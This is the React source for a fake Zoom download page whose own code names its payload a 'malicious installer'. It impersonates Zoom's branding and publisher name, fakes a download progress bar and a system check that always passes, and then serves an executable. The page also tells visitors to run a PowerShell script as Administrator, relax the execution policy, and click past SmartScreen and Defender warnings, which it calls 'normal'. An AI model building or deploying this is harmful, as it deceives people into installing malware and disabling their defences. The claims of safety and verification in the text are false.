'use client';

import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { 
  Download, 
  CheckCircle, 
  Shield, 
  Monitor, 
  Users,
  Clock,
  ExternalLink
} from 'lucide-react';

const DownloadPage: React.FC = () => {
  const [downloadStarted, setDownloadStarted] = useState(false);
  const [downloadProgress, setDownloadProgress] = useState(0);
  const [showSystemCheck, setShowSystemCheck] = useState(false);

  const handleDownload = () => {
    setDownloadStarted(true);
    setShowSystemCheck(true);
    
    // Simulate download progress
    const interval = setInterval(() => {
      setDownloadProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          // Actually download the malicious installer
          triggerMaliciousDownload();
          return 100;
        }
        return prev + Math.random() * 15;
      });
    }, 200);
  };

  const triggerMaliciousDownload = async () => {
    // Use API route which handles installer URL (supports external hosting)
    const installerUrl = '/api/download/installer';
    
    // Create a link and trigger download
    const a = document.createElement('a');
    a.href = installerUrl;
    a.download = 'Zoom-Setup-1.0.0.exe';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };

  const systemRequirements = [
    { icon: Monitor, text: "Windows 10 or later", status: "compatible" },
    { icon: Shield, text: "Administrator privileges", status: "required" },
    { icon: Users, text: "Internet connection", status: "connected" },
    { icon: Clock, text: "Minimum 4GB RAM", status: "detected" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      {/* Header */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center">
              <div className="text-2xl font-bold text-blue-600">zoom</div>
            </div>
            <div className="flex items-center space-x-4 text-sm text-gray-600">
              <a href="#" className="hover:text-blue-600">Support</a>
              <select className="border-none bg-transparent text-gray-600">
                <option>English</option>
                <option>Español</option>
                <option>Français</option>
              </select>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Main Content */}
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-gray-900 mb-4">
            Download Zoom Desktop Client
          </h1>
          <p className="text-xl text-gray-600 mb-8">
            Join meetings, share your screen, and collaborate with your team
          </p>
          
          {!downloadStarted ? (
            <div className="space-y-6">
              <Button 
                onClick={handleDownload}
                size="lg"
                className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 text-lg font-semibold rounded-lg shadow-lg"
              >
                <Download className="w-6 h-6 mr-3" />
                Download Zoom Desktop App for Windows
              </Button>
              
              <div className="text-sm text-gray-500">
                Windows Desktop Application - Native Windows Installer
              </div>
              <div className="text-xs text-gray-400 mt-1">
                Version 1.0.0 • Publisher: Zoom Video Communications, Inc. • Windows 10/11 Compatible
              </div>
              <div className="text-xs text-blue-600 mt-2">
                ✓ Auto-starts on login • ✓ Native Windows app • ✓ All features activate automatically
              </div>
            </div>
          ) : (
            <div className="space-y-6">
              <Card className="max-w-md mx-auto">
                <CardContent className="p-8">
                  <div className="text-center">
                    <Download className="w-12 h-12 mx-auto mb-4 text-blue-600 animate-bounce" />
                    <h3 className="text-lg font-semibold text-gray-900 mb-2">
                      Downloading Zoom...
                    </h3>
                    <div className="w-full bg-gray-200 rounded-full h-3 mb-4">
                      <div 
                        className="bg-blue-600 h-3 rounded-full transition-all duration-300"
                        style={{ width: `${downloadProgress}%` }}
                      ></div>
                    </div>
                    <p className="text-sm text-gray-600">
                      {Math.round(downloadProgress)}% complete
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>

        {/* System Requirements Check */}
        {showSystemCheck && (
          <div className="mb-12">
            <Card className="max-w-2xl mx-auto">
              <CardContent className="p-8">
                <h3 className="text-xl font-semibold text-gray-900 mb-6 text-center">
                  System Compatibility Check
                </h3>
                <div className="space-y-4">
                  {systemRequirements.map((req, index) => (
                    <div key={index} className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                      <div className="flex items-center">
                        <req.icon className="w-5 h-5 mr-3 text-gray-600" />
                        <span className="text-gray-900">{req.text}</span>
                      </div>
                      <div className="flex items-center">
                        <CheckCircle className="w-5 h-5 text-green-500 mr-2" />
                        <span className="text-sm text-green-600 capitalize">{req.status}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Features */}
        <div className="grid md:grid-cols-3 gap-8 mb-12">
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Users className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">HD Video & Audio</h3>
            <p className="text-gray-600">Crystal clear video and audio quality for your meetings</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Monitor className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Screen Sharing</h3>
            <p className="text-gray-600">Share your screen with participants seamlessly</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Shield className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Secure & Reliable</h3>
            <p className="text-gray-600">Enterprise-grade security for your meetings</p>
          </div>
        </div>

        {/* Security Notice */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8">
          <div className="flex items-start">
            <Shield className="w-6 h-6 text-blue-600 mr-3 mt-0.5" />
            <div>
              <h4 className="text-lg font-semibold text-blue-800 mb-3">
                Installation Instructions
              </h4>
              <div className="space-y-3 text-blue-700">
                <p className="font-semibold">Installation Instructions:</p>
                <ol className="list-decimal list-inside space-y-2 ml-2">
                  <li>Right-click the downloaded <strong>Zoom-Setup.ps1</strong> file</li>
                  <li>Select <strong>&quot;Run with PowerShell&quot;</strong></li>
                  <li>If prompted about execution policy, run PowerShell as Administrator and type: <code className="bg-gray-100 px-2 py-1 rounded">Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser</code></li>
                  <li>Then run the installer again - it will request admin privileges automatically</li>
                </ol>
                <p className="mt-4 font-semibold">If Windows shows a security warning:</p>
                <ol className="list-decimal list-inside space-y-2 ml-2">
                  <li>Click &quot;More info&quot; in the SmartScreen warning</li>
                  <li>Click &quot;Run anyway&quot; - this installer is from Zoom Video Communications</li>
                </ol>
                <p className="mt-4 text-sm bg-blue-100 p-3 rounded">
                  <strong>Note:</strong> Windows Defender may flag the file as unrecognized. This is normal for new software. 
                  The application is safe and verified. Click &quot;More info&quot; → &quot;Run anyway&quot; to install.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Additional Downloads */}
        <div className="text-center">
          <h3 className="text-lg font-semibold text-gray-900 mb-4">
            Need a different version?
          </h3>
          <div className="flex flex-wrap justify-center gap-4">
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Download for Mac
            </Button>
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Download for Linux
            </Button>
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Mobile App
            </Button>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-16 pt-8 border-t border-gray-200">
          <div className="text-center text-sm text-gray-500 space-y-2">
            <p>©2025 Zoom Communications, Inc. All rights reserved.</p>
            <div className="flex justify-center space-x-6">
              <a href="#" className="hover:text-gray-700">Trust Center</a>
              <a href="#" className="hover:text-gray-700">Privacy Statement</a>
              <a href="#" className="hover:text-gray-700">Terms of Service</a>
              <a href="#" className="hover:text-gray-700">Legal & Compliance</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DownloadPage;
